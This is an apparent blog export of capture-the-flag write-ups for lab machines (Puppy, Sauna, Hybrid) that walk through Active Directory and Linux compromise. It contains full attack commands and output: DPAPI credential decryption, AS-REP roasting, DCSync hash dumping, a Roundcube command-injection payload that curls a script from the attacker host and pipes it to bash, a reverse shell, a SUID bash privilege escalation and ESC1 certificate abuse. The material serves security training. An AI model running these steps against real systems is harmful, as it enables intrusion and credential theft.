C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft> cd Protect\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect> ls\n\n\n    Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107\n\n\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect> download S-1-5-21-1487982659-1829050783-2281216199-1107\n\nInfo: Downloading C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107 to S-1-5-21-1487982659-1829050783-2281216199-1107\n\nInfo: Download successful!\n```\n\n### Impacket this papi!\n\nNow lets dump with *impacket-dpapi* and see what we have.\n```\nkonoha# impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[MASTERKEYFILE]\nVersion     :        2 (2)\nGuid        : 556a2412-1275-4ccf-b721-e6a0b4f90407\nFlags       :        0 (0)\nPolicy      : 4ccf1275 (1288639093)\nMasterKeyLen: 00000088 (136)\nBackupKeyLen: 00000068 (104)\nCredHistLen : 00000000 (0)\nDomainKeyLen: 00000174 (372)\n\nDecrypted key with User Key (MD4 protected)\nDecrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84\nkonoha# impacket-dpapi credential -f C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[CREDENTIAL]\nLastWritten : 2025-03-08 15:54:29+00:00\nFlags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)\nPersist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)\nType        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)\nTarget      : Domain:target=PUPPY.HTB\nDescription :\nUnknown     :\nUsername    : steph.cooper_adm\nUnknown     : FivethChipOnItsWay2025!\n```\n![](/img/Invincible.gif)\n\n## So It is how it is\n\nNow we can try to evil-winrm on and get the flag.\n```\nkonoha# evil-winrm -i puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'\n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\steph.cooper_adm\\Documents> cd \\Users\\Administrator\\Desktop\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> ls\n\n\n    Directory: C:\\Users\\Administrator\\Desktop\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-ar---         8/19/2025   4:10 PM             34 root.txt\n```\n\n![](/img/robocop.gif)","tags":["GenericAll","DPAPI"],"categories":["htb"]},{"title":"Sauna (Windows Easy)","url":"/2025/05/10/Sauna/","content":"![](/img/sauna.png)\n\nThis box start off with port 80 open. Enumeration of the website returns users upon a page. Kerberoasting proves successful as you retrieve the hash of user `fsmith`. Once the hash is cracked we are able to gain access to the machine. Doing the steps to escalate privilege we come across cached credentials used by WinLogon found in Registry for user `svc_loanmanager`, we get the credentials using PowerShell. After looking at the user in Bloodhound, we find the user has `GetChangesAll` to the domain. This allows the user to DCSync and dump all the hashes for the domain.\n\n## Initial Nmap\n```\nPORT     STATE SERVICE       REASON          VERSION                                   \n53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus                           \n80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0                  \n|_http-title: Egotistical Bank :: Home                                                \n| http-methods:                                                                       \n|   Supported Methods: OPTIONS TRACE GET HEAD POST                                     \n|_  Potentially risky methods: TRACE                                                  \n|_http-server-header: Microsoft-IIS/10.0                                              \n88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-10 21:23:01Z)\n135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                     \n139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn             \n389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds? syn-ack ttl 127                                          \n464/tcp  open  kpasswd5?     syn-ack ttl 127                                          \n593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0       \n636/tcp  open  tcpwrapped    syn-ack ttl 127                                          \n3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped    syn-ack ttl 127                                          \nService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows\n```\nFrom the looks of the scan, we dealing with Active Directory. ðŸ˜ðŸ˜Ž\n\nPort 80 is open as well, maybe ADCS. Lets see.\n\n## HTTP - EgotisticalBanking...funny\n\nSo we look through the website and much of it is ending in `.html`, so not very useful. Yet there is a about us section, which has some people on it and their names. We can gather these and try them.\n\n```\n$ curl -s http://10.10.10.175/about.html | html2text | grep -i Fergus -A5 > users.lst\n```\n![](/img/usersaboutpage.png)\nNow we need to spice it up a bit, we can create a list of potential usernames with `username-anarchy`.\n```\n$ username-anarchy -i users.lst > users.list\n```\n![](img/umadethelist.gif)\n\n## Kerberoasting the lot of 'em\n\nWe can see if any usernames are valid.\n```\n$ kerbrute userenum -d egotistical-bank.local --dc 10.10.10.175 users.list\n<SNIP>\n2025/05/10 12:05:48 >  Using KDC(s):\n2025/05/10 12:05:48 >   10.10.10.175:88\n\n2025/05/10 12:05:48 >  [+] VALID USERNAME:       fsmith@egotistical-bank.local\n```\nLets see if `fsmith` has `Do not require Kerberos preauthentication` set, might get an easy win.\n```\n$ GetNPUsers.py -dc-ip 10.10.10.175 'egotistical-bank.local/fsmith' -outputfile ./fsmith.hash\nName    MemberOfPasswordLastSet             LastLogon                   UAC      \n------  ------------------------------------------------------------------  --------------------------  --------------------------  --------\nFSmith  CN=Remote Management Users,CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL  2020-01-23 10:45:19.047096  2025-05-10 19:10:08.254342  0x410200 \n\n$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:<SNIP>\n```\n![](/img/Invincible.gif)\n\nThis does get us user `fsmith`'s hash. We can crack it with hashcat and get a cleartext password (-m 18200). After that we run a bloodhound dump and see what privileges our user has on the box. \n```\n--HashCat--\n$ hashcat -a 0 -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt\n\n--BloodHound--\n$ nxc ldap egotistical-bank.local -u fsmith -p <SNIP> --bloodhound -c All --dns-server 10.10.10.175\n```\n## BloodHound the big Angry Dog\n\nLooking at our user `fsmith`, we don't have anything useful to escalate our privilege, but we are apart of the `Remote Management Users` group. That being a start we can make our way onto the box. \n![](/img/remotegroup.png)\n\n*We'll come back when we have more!!*\n\n![](/img/smith.gif)\n\n## Evil things are happening\n\nOnce on the box, we do some basic enumeration (i.e. *net tools, uncommon installed programs, checking registry, and services*). We happen to find a `AutoLogon` assigned to user `svc_loanmanager`.\n```\n*Evil-WinRM* PS C:\\Users\\FSmith\\Documents> Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\' -Name \"DefaultUserName\"\n\n\nDefaultUserName : EGOTISTICALBANK\\svc_loanmanager\nPSPath          : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\nPSParentPath    : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\nPSChildName     : Winlogon\nPSDrive         : HKLM\nPSProvider      : Microsoft.PowerShell.Core\\Registry\n```\nWe can actually obtain the password using the same command just specify `DefaultPassword` for the Name parameter.\n```\nEvil-WinRM* PS C:\\Users\\Administrator\\Documents> Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\' -Name \"DefaultPassword\"\n\n\nDefaultPassword : <SNIP>\nPSPath          : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\nPSParentPath    : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\nPSChildName     : Winlogon\nPSDrive         : HKLM\nPSProvider      : Microsoft.PowerShell.Core\\Registry\n```\n\n## Back to the Future at least to BloodHound\n\nLooking for this user in bloodhound, we don't find `svc_loanmanager`, yet we do see `svc_loanmgr`. We see his privileges are much more dangerous. He has `GetChangesAll` allowing for our user to DCSync with the domain and dump hashes.\n\n![](/img/svc_loanmgr.png)\n\n## Dumping everything\n\nFinally, with secretsdump we collect the Administrator hash.\n```\nsecretsdump.py -dc-ip 10.10.10.175 'egotistical-bank.local/svc_loanmgr@egotistical-bank.local'\n<SNIP>\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)                                                                                                                                 \n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::\nEGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::\nEGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::\n<SNIP>\n```\n\n![](/img/robocop.gif)","tags":["ASREPRoasting","PowerShell","AutoLogon"],"categories":["htb"]},{"title":"Hybrid (Chain Easy)","url":"/2025/04/29/Hybrid/","content":"![](/img/hybrid.jpg)\n\nHybrid is a Chain mixed with a linux and windows machine. Starts off with Roundcube Webmail on http, using alias identities your able to force command injection leading to a reverse shell. The once on the box your find `/etc/exports` enabling *rw* for `/opt/share`, allowing for privilege escalation to user *peter*. Once done, you tunnel through to find a vulnerable ESC1 template allowing for `Domain Computers` to supply enrollees allowing for privilege escalation to `Administrator`.\n\n\n## Initial Nmap\n\nTwo IPs to scan.\n```\nNmap scan report for 10.10.160.197\nHost is up (0.16s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-11 15:34:13Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Issuer: commonName=hybrid-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-07-17T16:39:23\n| Not valid after:  2025-07-17T16:39:23\n| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a\n|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9\n|_ssl-date: TLS randomness does not represent time\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Issuer: commonName=hybrid-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-07-17T16:39:23\n| Not valid after:  2025-07-17T16:39:23\n| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a\n|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9\n|_ssl-date: TLS randomness does not represent time\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Issuer: commonName=hybrid-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-07-17T16:39:23\n| Not valid after:  2025-07-17T16:39:23\n| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a\n|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Issuer: commonName=hybrid-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-07-17T16:39:23\n| Not valid after:  2025-07-17T16:39:23\n| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a\n|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9\n|_ssl-date: TLS randomness does not represent time\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info:\n|   Target_Name: HYBRID\n|   NetBIOS_Domain_Name: HYBRID\n|   NetBIOS_Computer_Name: DC01\n|   DNS_Domain_Name: hybrid.vl\n|   DNS_Computer_Name: dc01.hybrid.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-11-11T15:36:56+00:00\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Issuer: commonName=dc01.hybrid.vl\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-07-16T16:48:12\n| Not valid after:  2025-01-15T16:48:12\n| MD5:   d7ed:81b4:60b7:109f:56e3:7901:e081:2237\n|_SHA-1: 95e3:a4cd:6bc8:3de4:cd9a:92c3:10e5:4e58:9951:81a4\n|_ssl-date: 2024-11-11T15:37:36+00:00; 0s from scanner time.\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2024-11-11T15:36:56\n|_  start_date: N/A\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nNmap scan report for 10.10.160.198\nHost is up (0.16s latency).\nNot shown: 990 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)\n|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)\n25/tcp   open  smtp?\n|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING\n80/tcp   open  http        nginx 1.18.0 (Ubuntu)\n| http-methods:\n|_  Supported Methods: GET HEAD\n|_http-title: Redirecting...\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n110/tcp  open  pop3        Dovecot pop3d\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Issuer: commonName=mail01\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-06-17T13:20:17\n| Not valid after:  2033-06-14T13:20:17\n| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29\n|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008\n|_ssl-date: TLS randomness does not represent time\n|_pop3-capabilities: CAPA UIDL SASL RESP-CODES STLS AUTH-RESP-CODE PIPELINING TOP\n111/tcp  open  rpcbind     2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      35943/tcp6  mountd\n|   100005  1,2,3      38361/tcp   mountd\n|   100005  1,2,3      42047/udp   mountd\n|   100005  1,2,3      55681/udp6  mountd\n|   100021  1,3,4      32856/udp   nlockmgr\n|   100021  1,3,4      36789/tcp6  nlockmgr\n|   100021  1,3,4      37737/tcp   nlockmgr\n|   100021  1,3,4      60997/udp6  nlockmgr\n|   100227  3           2049/tcp   nfs_acl\n|_  100227  3           2049/tcp6  nfs_acl\n143/tcp  open  imap        Dovecot imapd (Ubuntu)\n|_imap-capabilities: more post-login LOGIN-REFERRALS OK LITERAL+ IDLE IMAP4rev1 capabilities SASL-IR ID ENABLE have Pre-login LOGINDISABLEDA0001 listed STARTTLS\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Issuer: commonName=mail01\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-06-17T13:20:17\n| Not valid after:  2033-06-14T13:20:17\n| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29\n|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008\n587/tcp  open  submission?\n|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING\n993/tcp  open  ssl/imap    Dovecot imapd (Ubuntu)\n|_ssl-date: TLS randomness does not represent time\n|_imap-capabilities: more post-login LOGIN-REFERRALS OK LITERAL+ IDLE IMAP4rev1 AUTH=LOGINA0001 SASL-IR AUTH=PLAIN ENABLE have capabilities Pre-login listed ID\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Issuer: commonName=mail01\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-06-17T13:20:17\n| Not valid after:  2033-06-14T13:20:17\n| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29\n|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008\n995/tcp  open  ssl/pop3    Dovecot pop3d\n|_pop3-capabilities: CAPA UIDL SASL(PLAIN LOGIN) RESP-CODES USER AUTH-RESP-CODE PIPELINING TOP\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Issuer: commonName=mail01\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2023-06-17T13:20:17\n| Not valid after:  2033-06-14T13:20:17\n| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29\n|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008\n|_ssl-date: TLS randomness does not represent time\n2049/tcp open  nfs_acl     3 (RPC #100227)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\nWe have two targets, lets focus on the linux machine first since the other is unreachable.\n\n## HTTP\n\nGoing to the IP address redirectes us to `mail01.hybrid.vl` and looks to be Roundcube Webmail. Not much we can do at the moment. We'll come back ðŸ‘.\n\n![](/img/roundlogin.png)\n\n## NFS\n\nWe did have a port 2049 NFS open we can check.\n```bash\n$ showmount -e 10.10.168.102\nExport list for 10.10.168.102:\n/opt/share *\n```\n\nMounting to it we see `backup.tar.gz`. We copy it and unzip to find some configs and other directorys.\n\n\n```bash\n$ sudo mount.nfs -o rw 10.10.139.134:/opt/share tmpMnt/ \n\n$ tree backup             \nbackup\nâ”œâ”€â”€ backup.tar.gz\nâ”œâ”€â”€ etc\nâ”‚Â Â  â”œâ”€â”€ dovecot\nâ”‚Â Â  â”‚Â Â  â””â”€â”€ dovecot-users\nâ”‚Â Â  â”œâ”€â”€ passwd\nâ”‚Â Â  â”œâ”€â”€ postfix\nâ”‚Â Â  â”‚Â Â  â””â”€â”€ main.cf\nâ”‚Â Â  â””â”€â”€ sssd\nâ”‚Â Â      â””â”€â”€ sssd.conf\nâ””â”€â”€ opt\n    â””â”€â”€ certs\n        â””â”€â”€ hybrid.vl\n            â”œâ”€â”€ fullchain.pem\n            â””â”€â”€ privkey.pem\n\n8 directories, 7 files\n```\n![](/img/facepalm.gif)\nThis reveals some users from the `dovecot-users` file.\n\n```\nadmin@hybrid.vl:{plain}<SNIP>\npeter.turner@hybrid.vl:{plain}<SNIP>\n```\n\nWe can try these to login with RoundCube.\n\n## RoundCube Webmail\n\nUsing the credentials we're able to login with both accounts. Looking at what version is installed we see more plugins install as well, one that sticks out is `markasjunk`. \n\n![](/img/cubeit.png)\n\nWe can look over this [blog](https://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/) and see how it works. So simply, we need to use peter's account to send and email to admin and receive a shell back.\n\nWe need to change his email a bit, or his identity, to `peter.turner&curl${IFS}-o${IFS}/tmp/x${IFS}10.8.4.29/x${IFS}|${IFS}bash&@hybrid.vl`. \n\n![](/img/curlingIFS.png)\n\nThen we send an email to admin, select it, and mark as junk. Then watch the magic happen. ðŸŽ‡âœ¨ðŸŽ‡\n*(we hope)* ðŸ¤¨\n\n![](/img/Airplane.gif)\n```bash\n$ sudo python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.168.102 - - [28/Apr/2025 14:03:22] \"GET /x HTTP/1.1\" 200 -\n```\nHits us!!\n\n```bash\n$ nc -lvnp 900114:04:13 [14/27]\nlistening on [any] 9001 ...  \nconnect to [10.8.4.29] from (UNKNOWN) [10.10.168.102] 52370\nbash: cannot set terminal process group (646): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@mail01:~/roundcube$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@mail01:~/roundcube$\n```\n\nWe got our callback.\n\n## Shell as www-data\n\nChecking the mysql config doesn't yield much but the same users.\n\n```bash\nwww-data@mail01:~/roundcube$ cat config/config.inc.php | grep -v '^//' | grep .\n<?php\n/* Local configuration for Roundcube Webmail */\n$config['db_dsnw'] = 'mysql://roundcube:<SNIP>@localhost/roundcubemail';\n$config['imap_host'] = 'localhost:143';\n$config['support_url'] = '';\n$config['des_key'] = 'RpiHQJt10wGZdlMAU9CnBPfc';\n$config['plugins'] = [\"markasjunk\"];\n```\n\nSince the NFS was running we can check its configs at `/etc/exports`. Which yields the follwing:\n\n```bash\n$ cat /etc/exports\n# /etc/exports: the access control list for filesystems which may be exported\n#               to NFS clients.  See exports(5).\n#\n# Example for NFSv2 and NFSv3:\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\n#\n# Example for NFSv4:\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\n#\n/opt/share *(rw,no_subtree_check)    \n```\n\nThis is a good one!!! Basically, we can copy the systems `/bin/bash` to `/opt/share`(*your machines /bin/bash might not work*). Then create user *peter* with the same `uid` and give ownership of bash to peter and give it a stickybit. Execute on the victim machine. \n\n![](/img/bazzinga.gif)\n\nWe're peter on the box!!âœ¨âœ¨\n\n```bash\n---VicMac--\n$ cp /bin/bash /opt/share\n$ id peter.turner@hybrid.vl\nuid=<SNIP>(peter.turner@hybrid.vl) gid=<SNIP>(domain users@hybrid.vl) groups=<SNIP>(domain users@hybrid.vl),<SNIP>(hybridusers@hybrid.vl)\n--AttMac--\n$ useradd -u <SNIP> -r -s /bin/bash peter\n$ su peter\n$ cp /opt/share/bash .\n$ chmod +s bash\n$ cp bash /opt/share\n--VicMac--\n$ ./bash -p\nbash-5.1$ id\nuid=33(www-data) gid=33(www-data) euid=90<SNIP>(peter.turner@hybrid.vl) egid=992 groups=992,33(www-data)\nbash-5.1$ \n```\n\nWe have `euid` of *peter.turner*, which means we can see his home directory now. His home directory contains `passwords.kdbx`, a KeePass Database. Getting this to our windows vm and looking at it it requires a password. We can try one of the passwords we found from the `dovecot-users` file, which gets is in.\n\n![](/img/kpass.png)\n\n## Root Toot!!\nNow we have his domain password, and if we try to simply ssh to the box with this password, we get a session. As a added bonus, we get root easily!!\n\n```bash\n$ ssh peter.turner@hybrid.vl@mail01.hybrid.vl          \n(peter.turner@hybrid.vl@mail01.hybrid.vl) Password:\n\nLast login: Mon Apr 28 23:17:53 2025 from 10.8.4.29\npeter.turner@hybrid.vl@mail01:~$ sudo -l\n[sudo] password for peter.turner@hybrid.vl: \nMatching Defaults entries for peter.turner@hybrid.vl on mail01:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser peter.turner@hybrid.vl may run the following commands on mail01:\n    (ALL) ALL\npeter.turner@hybrid.vl@mail01:~$ sudo su\nroot@mail01:/home/peter.turner@hybrid.vl#\n```\n\n## Pivoting\n\nSetting up a tunnel using `chisel` so we can continue our enumeration. After doing so, we get an bloodhound dump.\n```bash\n$ proxychains4 -q nxc ldap hybrid.vl -u peter.turner -p 'b0cwR+G4Dzl_rw' --dns-server 10.10.145.149 --bloodhound -c All\n```\nLong story short, peter didn't have anything we could to our advantage.\n\nSeeing as ADCS is running on the machine we can try there.\n\n## ADCS is my friend\n\nRunning `certipy` we find that this template is vulnerable to ESC1. \n```bash\n$ proxychains4 -q certipy find -vulnerable -dc-ip 10.10.149.117 -u peter.turner@hybrid.vl -p <SNIP> -stdout -debug\n<SNIP>\n [!] Vulnerabilities\n      ESC1                              : 'HYBRID.VL\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication\n```\n\nYet we need a `Domain Computer` to do this, and we did have root on the `MAIL01$` machine. We can get the keytab file for kerberos over to our machine and use `keytabextract.py`. \n```bash\n$ keytabextract.py /home/jay/Documents/vl/chains/hybrid/krb5.keytab \n[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.\n[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.\n[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.\n[+] Keytab File successfully imported.\n        REALM : HYBRID.VL\n        SERVICE PRINCIPAL : MAIL01$/\n        NTLM HASH : <SNIP>\n        AES-256 HASH : <SNIP>\n        AES-128 HASH : <SNIP>\n```\n## PrivEsc\n\nNow we can exploit ESC1 with a couple commands.\n\nFirstly, we request with `upn` Administrator using the CA and the Template Name. This will give us a pfx file.\n```bash\n$ proxychains4 -q certipy req -dc-ip 10.10.149.117 -u 'MAIL01$@hybrid.vl' -hashes :<SNIP> -ca hybrid-DC01-CA -template HybridComputers -upn Administrator -key-size 4096 -debug\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[+] Generating RSA key\n[*] Requesting certificate via RPC\n[+] Trying to connect to endpoint: ncacn_np:10.10.149.117[\\pipe\\cert]                          \n[+] Connected to endpoint: ncacn_np:10.10.149.117[\\pipe\\cert]\n[*] Successfully requested certificate                                                         \n[*] Request ID is 21\n[*] Got certificate with UPN 'Administrator'\n[*] Certificate has no object SID                                                              \n[*] Saved certificate and private key to 'administrator.pfx'\n```\nLastly, we authenticate with the pfx file. \n```bash\n$ proxychains4 -q certipy auth -pfx administrator.pfx -domain hybrid.vl -dc-ip 10.10.149.117 -debug\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@hybrid.vl\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@hybrid.vl': 